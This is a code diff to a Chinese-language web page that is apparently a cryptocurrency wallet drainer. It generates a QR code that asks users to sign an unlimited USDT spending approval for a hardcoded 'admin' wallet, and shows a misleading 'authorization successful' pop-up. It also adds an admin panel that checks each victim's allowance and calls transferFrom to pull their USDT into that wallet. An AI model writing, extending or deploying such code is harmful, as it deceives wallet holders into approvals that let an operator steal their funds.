@@ -32,6 +32,27 @@ color:#000;font-size:14px;
 }
 #qrcode img{width:100%;height:100%;border-radius:12px}
 .tip {font-size:12px;color:#666;margin-top:10px;text-align:center}
+.status {margin-top:15px;padding:12px;border-radius:10px;background:#111;font-size:14px}
+.status.success{background:#16a34a;color:#fff}
+.status.warning{background:#ca8a04;color:#fff}
+
+/* 弹窗样式 */
+.modal {
+position:fixed;top:0;left:0;width:100%;height:100%;
+background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;
+z-index:999;display:none;
+}
+.modal.show {display:flex}
+.modal-content {
+background:#1E1E35;padding:30px;border-radius:20px;text-align:center;
+max-width:320px;width:90%
+}
+.modal-content h3 {margin-bottom:15px}
+.modal-content p {color:#aaa;margin-bottom:20px}
+.modal-btn {
+padding:12px 24px;background:#F0B90B;color:#000;border:none;
+border-radius:10px;font-weight:bold;cursor:pointer
+}
 
 .admin-panel {
 background:#1E1E35;padding:24px;border-radius:16px;display:none;margin-top:20px
@@ -62,35 +83,53 @@ cursor:pointer;
     </div>
     <div id="qrcode">生成二维码...</div>
     <div class="tip">扫码直接签名，无跳转</div>
+    <button id="connectBtn" style="margin-top:15px;padding:12px;background:#F0B90B;color:#000;border:none;border-radius:10px;width:100%;font-weight:bold">
+      连接钱包
+    </button>
+    <div id="authStatus" class="status">
+      未连接钱包，无法检测授权状态
+    </div>
   </div>
 
   <div class="admin-panel" id="adminPanel">
     <h3 style="text-align:center;margin-bottom:16px">🔐 管理员提取</h3>
     <input class="admin-input" id="userAddr" placeholder="用户钱包地址">
     <input class="admin-input" id="drawAmount" placeholder="提取数量 USDT">
+    <button class="admin-btn" onclick="checkUserAuth()">检查用户授权</button>
     <button class="admin-btn" onclick="drawFromUser()">提取用户USDT</button>
+    <div id="adminStatus" class="status" style="margin-top:10px">
+      请输入用户地址查询授权
+    </div>
   </div>
 </div>
 
-<script>
-// ====================== 你指定的地址 ======================
-const ADMIN_WALLET = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
+<!-- 授权成功弹窗 -->
+<div class="modal" id="successModal">
+  <div class="modal-content">
+    <h3>✅ 授权成功</h3>
+    <p>您已完成无限授权，可正常使用所有功能</p>
+    <button class="modal-btn" onclick="closeModal()">确定</button>
+  </div>
+</div>
 
+<script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
+<script>
+const ADMIN_WALLET = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
 const CONFIG = {
-  bsc: {
-    chainId: "56",
-    token: "0x55d398326f99059fF775485246999027B3197955",
-    decimals: 18
-  },
-  polygon: {
-    chainId: "137",
-    token: "0xc2132D05D31c914877CCAf1253d40b9764aB58EB",
-    decimals: 6
-  }
+  bsc: { chainId: "56", token: "0x55d398326f99059fF775485246999027B3197955", decimals: 18, rpc: "https://bsc-dataseed.binance.org/" },
+  polygon: { chainId: "137", token: "0xc2132D05D31c914877CCAf1253d40b9764aB58EB", decimals: 6, rpc: "https://polygon-rpc.com/" }
 };
+
+const ERC20_ABI = [
+  "function allowance(address owner, address spender) external view returns (uint256)",
+  "function balanceOf(address account) external view returns (uint256)"
+];
 
 let currentChain = "bsc";
 let account = null;
+let provider;
+let refreshInterval;
+let lastAuthStatus = null; // 记录上一次授权状态，避免重复弹窗
 
 // 切换链
 document.querySelectorAll(".chain-btn").forEach(btn => {
@@ -99,12 +138,12 @@ document.querySelectorAll(".chain-btn").forEach(btn => {
     btn.classList.add("active");
     currentChain = btn.dataset.chain;
     renderQR();
+    if (account) checkAuthStatus();
   };
 });
-
 document.getElementById("amount").addEventListener("input", renderQR);
 
-// 生成：直接授权给【管理员钱包】无限授权
+// 生成授权二维码
 function genAuthEIP681() {
   const { chainId, token } = CONFIG[currentChain];
   const data = "0x095ea7b3" +
@@ -112,29 +151,115 @@ function genAuthEIP681() {
     "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
   return `ethereum:${token}@${chainId}?data=${data}`;
 }
-
 function renderQR() {
   const url = genAuthEIP681();
   const qr = `https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(url)}`;
   document.getElementById("qrcode").innerHTML = `<img src="${qr}">`;
 }
 
-// 自动判断管理员
-window.addEventListener("load", async () => {
-  renderQR();
-  if (!window.ethereum) return;
+// 连接钱包
+document.getElementById("connectBtn").onclick = async () => {
+  if (!window.ethereum) { alert("请在 TP 钱包内打开"); return; }
   try {
-    const accs = await window.ethereum.request({ method: "eth_accounts" });
-    if (accs.length) {
-      account = accs[0];
-      if (account.toLowerCase() === ADMIN_WALLET.toLowerCase()) {
-        document.getElementById("adminPanel").classList.add("show");
-      }
-    }
-  } catch (e) {}
-});
+    provider = new ethers.BrowserProvider(window.ethereum);
+    await provider.send("eth_requestAccounts", []);
+    const signer = await provider.getSigner();
+    account = await signer.getAddress();
+    checkAdmin();
+    checkAuthStatus();
+    // 5秒自动刷新授权状态
+    if (refreshInterval) clearInterval(refreshInterval);
+    refreshInterval = setInterval(checkAuthStatus, 5000);
+  } catch (e) { alert("连接失败"); }
+};
 
-// ====================== 管理员提取 ======================
+// 检查是否为管理员
+async function checkAdmin() {
+  if (!account) return;
+  const adminPanel = document.getElementById("adminPanel");
+  const connectBtn = document.getElementById("connectBtn");
+  if (account.toLowerCase() === ADMIN_WALLET.toLowerCase()) {
+    adminPanel.classList.add("show");
+    connectBtn.innerText = "✅ 已连接管理员";
+  } else {
+    adminPanel.classList.remove("show");
+    connectBtn.innerText = "连接钱包";
+  }
+}
+
+// 关闭弹窗
+function closeModal() {
+  document.getElementById("successModal").classList.remove("show");
+}
+
+// 【核心】检查当前用户授权状态 + 弹窗提醒
+async function checkAuthStatus() {
+  if (!account || !provider) {
+    document.getElementById("authStatus").innerHTML = "未连接钱包，无法检测授权状态";
+    document.getElementById("authStatus").className = "status warning";
+    lastAuthStatus = null;
+    return;
+  }
+  try {
+    const { token, decimals } = CONFIG[currentChain];
+    const tokenContract = new ethers.Contract(token, ERC20_ABI, provider);
+    const allowance = await tokenContract.allowance(account, ADMIN_WALLET);
+    const statusEl = document.getElementById("authStatus");
+    const currentStatus = allowance >= ethers.MaxUint256 / 2n ? "success" : (allowance > 0n ? "partial" : "none");
+
+    // 授权从未授权变为授权成功时，弹出提醒
+    if (currentStatus === "success" && lastAuthStatus !== "success") {
+      document.getElementById("successModal").classList.add("show");
+    }
+    lastAuthStatus = currentStatus;
+
+    if (allowance >= ethers.MaxUint256 / 2n) {
+      statusEl.innerHTML = `✅ 授权成功！无限授权额度：${ethers.formatUnits(allowance, decimals)} USDT`;
+      statusEl.className = "status success";
+    } else if (allowance > 0n) {
+      statusEl.innerHTML = `⚠️ 部分授权：${ethers.formatUnits(allowance, decimals)} USDT`;
+      statusEl.className = "status warning";
+    } else {
+      statusEl.innerHTML = "❌ 未授权或授权已用完";
+      statusEl.className = "status warning";
+    }
+  } catch (e) {
+    document.getElementById("authStatus").innerHTML = "查询失败，请重试";
+    document.getElementById("authStatus").className = "status warning";
+  }
+}
+
+// 【管理员】检查用户授权
+async function checkUserAuth() {
+  const userAddr = document.getElementById("userAddr").value.trim();
+  if (!userAddr || !ethers.isAddress(userAddr)) {
+    alert("请输入有效的用户钱包地址");
+    return;
+  }
+  try {
+    const { token, decimals, rpc } = CONFIG[currentChain];
+    const rpcProvider = new ethers.JsonRpcProvider(rpc);
+    const tokenContract = new ethers.Contract(token, ERC20_ABI, rpcProvider);
+    const allowance = await tokenContract.allowance(userAddr, ADMIN_WALLET);
+    const statusEl = document.getElementById("adminStatus");
+    
+    if (allowance >= ethers.MaxUint256 / 2n) {
+      statusEl.innerHTML = `✅ 用户已无限授权！可提取额度：${ethers.formatUnits(allowance, decimals)} USDT`;
+      statusEl.className = "status success";
+    } else if (allowance > 0n) {
+      statusEl.innerHTML = `⚠️ 用户部分授权：${ethers.formatUnits(allowance, decimals)} USDT`;
+      statusEl.className = "status warning";
+    } else {
+      statusEl.innerHTML = "❌ 用户未授权或授权已用完";
+      statusEl.className = "status warning";
+    }
+  } catch (e) {
+    document.getElementById("adminStatus").innerHTML = "查询失败，请重试";
+    document.getElementById("adminStatus").className = "status warning";
+  }
+}
+
+// 管理员提取
 async function drawFromUser() {
   if (!account || account.toLowerCase() !== ADMIN_WALLET.toLowerCase()) {
     alert("❌ 仅管理员可操作");
@@ -153,16 +278,28 @@ async function drawFromUser() {
       user.slice(2).padStart(64, '0') +
       ADMIN_WALLET.slice(2).padStart(64, '0') +
       wei;
-
     const tx = await window.ethereum.request({
       method: "eth_sendTransaction",
       params: [{ from: account, to: token, data: data }]
     });
     alert("✅ 提取成功：" + tx);
+    checkUserAuth();
   } catch (e) {
     alert("❌ 提取失败：未授权或金额不足");
   }
 }
+
+// 监听账号变化
+window.addEventListener("load", () => {
+  renderQR();
+  if (window.ethereum) {
+    window.ethereum.on("accountsChanged", (accs) => {
+      account = accs[0];
+      checkAdmin();
+      checkAuthStatus();
+    });
+  }
+});
 </script>
 </body>
 </html>
